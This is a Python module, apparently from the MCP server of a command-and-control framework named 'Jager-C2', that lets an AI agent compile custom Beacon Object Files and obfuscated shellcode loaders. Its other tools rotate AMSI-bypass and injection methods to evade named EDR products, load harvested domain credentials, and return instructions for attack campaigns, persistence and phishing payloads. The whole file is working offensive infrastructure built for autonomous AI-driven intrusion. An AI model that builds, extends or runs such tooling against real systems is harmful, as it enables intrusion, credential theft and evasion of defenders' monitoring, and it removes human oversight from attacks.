"""AI-Native capabilities for Jager-C2 MCP server.

These tools enable the AI agent to dynamically generate, compile, and
deploy custom offensive tooling at runtime. The AI acts as a real-time
tool developer, creating purpose-built BOFs, loaders, and shellcode
based on the engagement context.

Architecture: The Cursor agent IS the LLM. It generates C source code
and passes it to these handlers which compile, validate, store, and
return ready-to-deploy artifacts. No separate LLM API call is needed.
"""

import hashlib
import json
import os
import secrets
import shutil
import subprocess
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict

_WORKSPACE = os.environ.get("HARNESS_WORKSPACE") or os.environ.get("JAGER_WORKSPACE", "")
_BOF_INCLUDE_DIR = Path(__file__).parent.parent.parent / "implant" / "include"
_BUILDS_DIR = Path(__file__).parent.parent.parent / "data" / "builds"


TOOLS = [
    {
        "name": "ai_generate_bof",
        "description": "Compile a custom BOF (Beacon Object File) from C source code. "
                       "The AI agent writes C code and this tool compiles it into a "
                       "ready-to-execute .o COFF file for c2_bof_exec.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "source_code": {
                    "type": "string",
                    "description": "Complete C source code for the BOF. Must include "
                                   "beacon.h and implement void go(char* args, int alen)."
                },
                "description": {
                    "type": "string",
                    "description": "Human-readable description of what this BOF does "
                                   "(used for metadata/audit, not compilation)"
                },
                "name": {
                    "type": "string",
                    "description": "Short name for the BOF artifact (e.g. 'enum_pipes')"
                },
                "arch": {
                    "type": "string",
                    "enum": ["x64", "x86"],
                    "default": "x64"
                },
                "extra_includes": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Additional include paths (absolute)"
                }
            },
            "required": ["source_code"]
        }
    },
    {
        "name": "ai_generate_loader",
        "description": "Compile a custom shellcode loader from C source code. "
                       "Produces a ready-to-deploy EXE or DLL that loads and executes "
                       "shellcode using the specified technique.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "source_code": {
                    "type": "string",
                    "description": "Complete C source for the loader. Should include "
                                   "shellcode embedding or fetch logic."
                },
                "shellcode_path": {
                    "type": "string",
                    "description": "Path to raw shellcode .bin file to embed (optional). "
                                   "If provided, shellcode is embedded as unsigned char payload[]."
                },
                "shellcode_build_id": {
                    "type": "string",
                    "description": "Build ID of existing implant to extract shellcode from"
                },
                "output_format": {
                    "type": "string",
                    "enum": ["exe", "dll"],
                    "default": "exe"
                },
                "arch": {
                    "type": "string",
                    "enum": ["x64", "x86"],
                    "default": "x64"
                },
                "name": {
                    "type": "string",
                    "description": "Short name for the loader artifact"
                },
                "obfuscate": {
                    "type": "boolean",
                    "default": True,
                    "description": "Apply dead-code insertion and OBF_KEY"
                }
            },
            "required": ["source_code"]
        }
    },
    {
        "name": "ai_adapt_technique",
        "description": "Given a failed technique and EDR detection details, produce "
                       "an adapted evasion configuration for the next implant build. "
                       "Returns concrete build parameters to pass to c2_build_implant.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "original_technique": {
                    "type": "string",
                    "description": "Name or description of the technique that was detected"
                },
                "detection_details": {
                    "type": "string",
                    "description": "How it was detected (event ID, rule name, behavior)"
                },
                "edr_product": {
                    "type": "string",
                    "description": "EDR product that detected it (e.g. CrowdStrike, Defender)"
                },
                "current_config": {
                    "type": "object",
                    "description": "Current build evasion config that was detected",
                    "properties": {
                        "amsi_bypass_method": {"type": "string"},
                        "sleep_technique": {"type": "string"},
                        "inject_method": {"type": "string"},
                        "syscall_method": {"type": "string"}
                    }
                }
            },
            "required": ["original_technique", "detection_details"]
        }
    },
    {
        "name": "ai_campaign_plan",
        "description": "Generate an autonomous attack campaign plan by querying current "
                       "engagement state (sessions, credentials, targets, access graph). "
                       "Returns ordered action list with prerequisites and risk scores.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "objective": {
                    "type": "string",
                    "description": "Campaign objective (e.g., 'domain_admin', 'data_exfil', 'persistence')"
                },
                "constraints": {
                    "type": "object",
                    "properties": {
                        "stealth_level": {"type": "string", "enum": ["low", "medium", "high", "maximum"]},
                        "time_limit_hours": {"type": "integer"},
                        "avoid_targets": {"type": "array", "items": {"type": "string"}},
                        "prefer_techniques": {"type": "array", "items": {"type": "string"}}
                    }
                },
                "current_access": {
                    "type": "string",
                    "description": "Description of current access level and position"
                }
            },
            "required": ["objective"]
        }
    },
    {
        "name": "ai_attack_graph",
        "description": "Compute attack paths from current position to objective using "
                       "engagement state (BloodHound data, credentials, vulnerabilities). "
                       "Returns weighted graph of hops with technique recommendations.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "source": {
                    "type": "string",
                    "description": "Starting session/access (session_id or 'current')"
                },
                "target": {
                    "type": "string",
                    "description": "Target objective (hostname, user, group, or 'domain_admin')"
                },
                "max_hops": {
                    "type": "integer",
                    "default": 5
                },
                "include_hypothetical": {
                    "type": "boolean",
                    "default": True,
                    "description": "Include paths requiring credential cracking or exploitation"
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "ai_suggest_persistence",
        "description": "Analyze target system and suggest optimal persistence mechanisms "
                       "based on access level, EDR presence, and stealth requirements.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "access_level": {
                    "type": "string",
                    "enum": ["user", "admin", "system"],
                    "default": "admin"
                },
                "stealth_priority": {
                    "type": "string",
                    "enum": ["low", "medium", "high"],
                    "default": "high"
                },
                "survive_reboot": {"type": "boolean", "default": True}
            },
            "required": ["session_id"]
        }
    },
    {
        "name": "ai_evade_detection",
        "description": "Given a specific EDR detection rule or behavior alert, "
                       "generate a plan to evade it while maintaining the same capability.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "detection_rule": {
                    "type": "string",
                    "description": "The detection rule/signature/behavior being triggered"
                },
                "current_method": {
                    "type": "string",
                    "description": "Current method being detected"
                },
                "required_capability": {
                    "type": "string",
                    "description": "What capability must be preserved"
                }
            },
            "required": ["detection_rule", "required_capability"]
        }
    },
    {
        "name": "ai_generate_phish",
        "description": "Generate a context-aware phishing payload (macro, HTA, LNK) "
                       "tailored to the target organization.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "format": {
                    "type": "string",
                    "enum": ["vba_macro", "hta", "lnk", "iso", "one_note", "html_smuggling"],
                    "default": "html_smuggling"
                },
                "payload_build_id": {
                    "type": "string",
                    "description": "Build ID of the payload to embed"
                },
                "pretext": {
                    "type": "string",
                    "description": "Social engineering pretext/theme"
                },
                "target_org": {
                    "type": "string",
                    "description": "Target organization for branding/theming"
                }
            },
            "required": ["format", "payload_build_id"]
        }
    },
]


def _ensure_bof_dir() -> Path:
    """Ensure BOF artifact directory exists."""
    bof_dir = _BUILDS_DIR / "bofs"
    bof_dir.mkdir(parents=True, exist_ok=True)
    return bof_dir


def _ensure_loaders_dir() -> Path:
    """Ensure loader artifact directory exists."""
    loader_dir = _BUILDS_DIR / "loaders"
    loader_dir.mkdir(parents=True, exist_ok=True)
    return loader_dir


def _get_bof_compiler(arch: str) -> str:
    if arch == "x86":
        return "i686-w64-mingw32-gcc"
    return "x86_64-w64-mingw32-gcc"


def _compile_bof(source_code: str, arch: str, name: str,
                 extra_includes: list = None) -> Dict[str, Any]:
    """Compile C source into a BOF .o COFF object file."""
    cc = _get_bof_compiler(arch)

    if shutil.which(cc) is None:
        return {"success": False, "error": f"Compiler not found: {cc}. Install mingw-w64."}

    bof_dir = _ensure_bof_dir()
    build_id = secrets.token_hex(4)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    safe_name = "".join(c for c in name if c.isalnum() or c in "-_")[:32] or "bof"
    out_name = f"{safe_name}-{build_id}-{timestamp}.o"
    out_path = bof_dir / out_name

    with tempfile.TemporaryDirectory(prefix="jager-bof-") as tmpdir:
        src_path = Path(tmpdir) / f"{safe_name}.c"
        src_path.write_text(source_code, encoding="utf-8")

        include_args = ["-I", str(_BOF_INCLUDE_DIR)]
        if extra_includes:
            for inc in extra_includes:
                if Path(inc).is_dir():
                    include_args.extend(["-I", inc])

        cmd = [
            cc, "-c", "-o", str(out_path),
            *include_args,
            "-Os", "-DWIN32_LEAN_AND_MEAN",
            str(src_path),
        ]

        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=60, cwd=tmpdir
        )

    if result.returncode != 0:
        return {
            "success": False,
            "error": f"Compilation failed:\n{result.stderr}",
            "compiler": cc,
            "command": " ".join(cmd),
        }

    file_bytes = out_path.read_bytes()
    sha256 = hashlib.sha256(file_bytes).hexdigest()
    file_size = len(file_bytes)

    metadata = {
        "success": True,
        "build_id": build_id,
        "artifact_type": "bof",
        "name": safe_name,
        "filename": out_name,
        "path": str(out_path),
        "sha256": sha256,
        "size": file_size,
        "arch": arch,
        "timestamp": timestamp,
        "compiler": cc,
    }

    meta_path = out_path.with_suffix(".json")
    meta_path.write_text(json.dumps(metadata, indent=2), encoding="utf-8")

    return metadata


def _compile_loader(source_code: str, arch: str, name: str,
                    output_format: str, shellcode_path: str = None,
                    obfuscate: bool = True) -> Dict[str, Any]:
    """Compile C source into a loader EXE or DLL."""
    cc = _get_bof_compiler(arch)

    if shutil.which(cc) is None:
        return {"success": False, "error": f"Compiler not found: {cc}. Install mingw-w64."}

    loader_dir = _ensure_loaders_dir()
    build_id = secrets.token_hex(4)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    safe_name = "".join(c for c in name if c.isalnum() or c in "-_")[:32] or "loader"

    ext = ".dll" if output_format == "dll" else ".exe"
    out_name = f"{safe_name}-{build_id}-{timestamp}{ext}"
    out_path = loader_dir / out_name

    with tempfile.TemporaryDirectory(prefix="jager-loader-") as tmpdir:
        src_path = Path(tmpdir) / f"{safe_name}.c"

        final_source = source_code
        if shellcode_path and Path(shellcode_path).is_file():
            sc_bytes = Path(shellcode_path).read_bytes()
            sc_array = ", ".join(f"0x{b:02x}" for b in sc_bytes)
            sc_def = (
                f"unsigned char payload[] = {{{sc_array}}};\n"
                f"unsigned int payload_len = {len(sc_bytes)};\n"
            )
            final_source = sc_def + "\n" + source_code

        src_path.write_text(final_source, encoding="utf-8")

        compile_flags = [
            "-Wall", "-Os", "-s", "-DWIN32_LEAN_AND_MEAN",
            "-I", str(_BOF_INCLUDE_DIR),
        ]

        if obfuscate:
            obf_key = secrets.randbelow(254) + 1
            compile_flags.append(f"-DOBF_KEY=0x{obf_key:02X}")

        if output_format == "dll":
            compile_flags.extend(["-DBUILD_DLL", "-shared"])
        else:
            compile_flags.append("-mwindows")

        cmd = [
            cc,
            *compile_flags,
            str(src_path),
            "-o", str(out_path),
            "-lwinhttp", "-ladvapi32", "-lws2_32",
            "-lbcrypt", "-lntdll", "-lkernel32",
            "-Wl,--gc-sections",
        ]

        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=120, cwd=tmpdir
        )

    if result.returncode != 0:
        return {
            "success": False,
            "error": f"Compilation failed:\n{result.stderr}",
            "compiler": cc,
        }

    file_bytes = out_path.read_bytes()
    sha256 = hashlib.sha256(file_bytes).hexdigest()
    file_size = len(file_bytes)

    metadata = {
        "success": True,
        "build_id": build_id,
        "artifact_type": "loader",
        "name": safe_name,
        "filename": out_name,
        "path": str(out_path),
        "sha256": sha256,
        "size": file_size,
        "arch": arch,
        "format": output_format,
        "timestamp": timestamp,
        "compiler": cc,
        "obfuscated": obfuscate,
    }

    meta_path = out_path.with_suffix(".json")
    meta_path.write_text(json.dumps(metadata, indent=2), encoding="utf-8")

    return metadata


def _adapt_technique(args: Dict[str, Any]) -> Dict[str, Any]:
    """Produce adapted evasion config based on detection feedback."""
    current = args.get("current_config") or {}
    edr = args.get("edr_product", "unknown").lower()
    detection = args.get("detection_details", "")

    adapted = {
        "amsi_bypass_method": current.get("amsi_bypass_method", "hwbp"),
        "sleep_technique": current.get("sleep_technique", "foliage"),
        "inject_method": current.get("inject_method", "threadless"),
        "syscall_method": current.get("syscall_method", "indirect"),
    }

    detection_lower = detection.lower()

    if "amsi" in detection_lower or "scriptblock" in detection_lower:
        bypass_rotation = ["hwbp", "pageguard", "patch"]
        current_bypass = adapted["amsi_bypass_method"]
        try:
            idx = bypass_rotation.index(current_bypass)
            adapted["amsi_bypass_method"] = bypass_rotation[(idx + 1) % len(bypass_rotation)]
        except ValueError:
            adapted["amsi_bypass_method"] = "hwbp"

    if "sleep" in detection_lower or "memory" in detection_lower or "heap" in detection_lower:
        adapted["sleep_technique"] = "foliage"
        adapted["heap_encrypt"] = True

    if "injection" in detection_lower or "remote_thread" in detection_lower:
        inject_rotation = ["threadless", "hollow", "apc", "classic"]
        current_inject = adapted["inject_method"]
        try:
            idx = inject_rotation.index(current_inject)
            adapted["inject_method"] = inject_rotation[(idx + 1) % len(inject_rotation)]
        except ValueError:
            adapted["inject_method"] = "threadless"

    if "syscall" in detection_lower or "ntdll" in detection_lower:
        if adapted["syscall_method"] == "indirect":
            adapted["syscall_method"] = "direct"
        else:
            adapted["syscall_method"] = "indirect"

    if "etw" in detection_lower:
        adapted["patch_etw"] = True

    if "crowdstrike" in edr or "falcon" in edr:
        adapted["inject_method"] = "threadless"
        adapted["sleep_technique"] = "foliage"
    elif "defender" in edr or "mde" in edr:
        adapted["amsi_bypass_method"] = "hwbp"
    elif "sentinel" in edr or "s1" in edr:
        adapted["inject_method"] = "hollow"

    return {
        "success": True,
        "original_technique": args["original_technique"],
        "detection_details": args["detection_details"],
        "edr_product": args.get("edr_product", "unknown"),
        "adapted_config": adapted,
        "build_params": {
            "amsi_bypass_method": adapted["amsi_bypass_method"],
            "sleep_technique": adapted["sleep_technique"],
            "inject_method": adapted["inject_method"],
        },
        "recommendation": (
            f"Rebuild implant with adapted config. Detection of "
            f"'{args['original_technique']}' suggests rotating "
            f"inject_method to '{adapted['inject_method']}' and "
            f"amsi_bypass to '{adapted['amsi_bypass_method']}'."
        ),
    }


def _query_engagement_state() -> Dict[str, Any]:
    """Read engagement state files for campaign planning."""
    state = {"sessions": [], "targets": [], "credentials": [], "access_paths": []}

    ws = Path(_WORKSPACE) if _WORKSPACE else None
    if not ws or not ws.is_dir():
        return state

    targets_file = ws / "engagements" / "dante" / "logs" / "c2-local-targets.jsonl"
    if targets_file.is_file():
        for line in targets_file.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line:
                try:
                    state["targets"].append(json.loads(line))
                except json.JSONDecodeError:
                    pass

    creds_file = ws / "evidence" / "ad-users-creds.csv"
    if creds_file.is_file():
        lines = creds_file.read_text(encoding="utf-8").splitlines()
        if len(lines) > 1:
            header = lines[0].split(",")
            for row in lines[1:]:
                fields = row.split(",")
                if len(fields) >= len(header):
                    state["credentials"].append(dict(zip(header, fields)))

    return state


async def handle(tool_name: str, args: Dict[str, Any], client) -> Dict[str, Any]:
    """Handle AI-native tool calls with real compile pipelines."""

    if tool_name == "ai_generate_bof":
        source_code = args.get("source_code", "")
        if not source_code or not source_code.strip():
            return {"success": False, "error": "source_code is required and must contain C source"}

        name = args.get("name", "custom_bof")
        arch = args.get("arch", "x64")
        extra_includes = args.get("extra_includes", [])

        result = _compile_bof(source_code, arch, name, extra_includes)

        if result.get("success") and args.get("description"):
            result["description"] = args["description"]

        return result

    elif tool_name == "ai_generate_loader":
        source_code = args.get("source_code", "")
        if not source_code or not source_code.strip():
            return {"success": False, "error": "source_code is required and must contain C source"}

        name = args.get("name", "custom_loader")
        arch = args.get("arch", "x64")
        output_format = args.get("output_format", "exe")
        obfuscate = args.get("obfuscate", True)

        shellcode_path = args.get("shellcode_path")
        if not shellcode_path and args.get("shellcode_build_id"):
            candidate = _BUILDS_DIR / f"implant-{args['shellcode_build_id']}*.bin"
            import glob
            matches = glob.glob(str(candidate))
            if matches:
                shellcode_path = matches[0]

        result = _compile_loader(
            source_code, arch, name, output_format,
            shellcode_path=shellcode_path,
            obfuscate=obfuscate,
        )
        return result

    elif tool_name == "ai_adapt_technique":
        return _adapt_technique(args)

    elif tool_name == "ai_campaign_plan":
        state = _query_engagement_state()
        return {
            "success": True,
            "objective": args["objective"],
            "engagement_state": state,
            "constraints": args.get("constraints", {}),
            "current_access": args.get("current_access", ""),
            "instruction": (
                "Use the engagement_state to plan attack steps. "
                "Query get_privesc_paths, get_credential_chains, "
                "get_exploitation_priorities for detailed path computation. "
                "Return ordered actions with {target, technique, prerequisites, risk}."
            ),
        }

    elif tool_name == "ai_attack_graph":
        state = _query_engagement_state()
        return {
            "success": True,
            "target": args["target"],
            "source": args.get("source", "current"),
            "max_hops": args.get("max_hops", 5),
            "engagement_state": state,
            "instruction": (
                "Use compute_shortest_path, get_dacl_abuse_paths, "
                "get_delegation_chains from the pentest MCP to compute "
                "actual graph edges. Return weighted paths."
            ),
        }

    elif tool_name == "ai_suggest_persistence":
        return {
            "success": True,
            "session_id": args["session_id"],
            "access_level": args.get("access_level", "admin"),
            "stealth_priority": args.get("stealth_priority", "high"),
            "survive_reboot": args.get("survive_reboot", True),
            "available_techniques": {
                "system": ["service", "schtask", "wmi_subscription", "com_hijack", "dll_sideload"],
                "admin": ["registry_run", "schtask", "service", "com_hijack"],
                "user": ["registry_run", "startup_folder", "com_hijack"],
            },
            "instruction": (
                "Query c2_exec_shell to enumerate installed AV/EDR, "
                "then select techniques that avoid detection. "
                "Use c2_persist_* tools to deploy chosen mechanism."
            ),
        }

    elif tool_name == "ai_evade_detection":
        return {
            "success": True,
            "detection_rule": args["detection_rule"],
            "current_method": args.get("current_method", ""),
            "required_capability": args["required_capability"],
            "evasion_options": {
                "amsi_bypass_methods": ["hwbp", "pageguard", "patch"],
                "sleep_techniques": ["foliage"],
                "inject_methods": ["threadless", "hollow", "apc", "classic"],
                "syscall_methods": ["indirect", "direct"],
            },
            "instruction": (
                "Analyze the detection_rule to determine which component triggered it. "
                "Use ai_adapt_technique with specific detection details, then rebuild "
                "with c2_build_implant using the adapted config."
            ),
        }

    elif tool_name == "ai_generate_phish":
        return {
            "success": True,
            "format": args["format"],
            "payload_build_id": args["payload_build_id"],
            "pretext": args.get("pretext", ""),
            "target_org": args.get("target_org", ""),
            "instruction": (
                "Generate the phishing payload source code, then use "
                "ai_generate_loader to compile it if it requires compilation, "
                "or return the template directly for script-based formats."
            ),
        }

    return {"success": False, "error": f"Unknown tool: {tool_name}"}
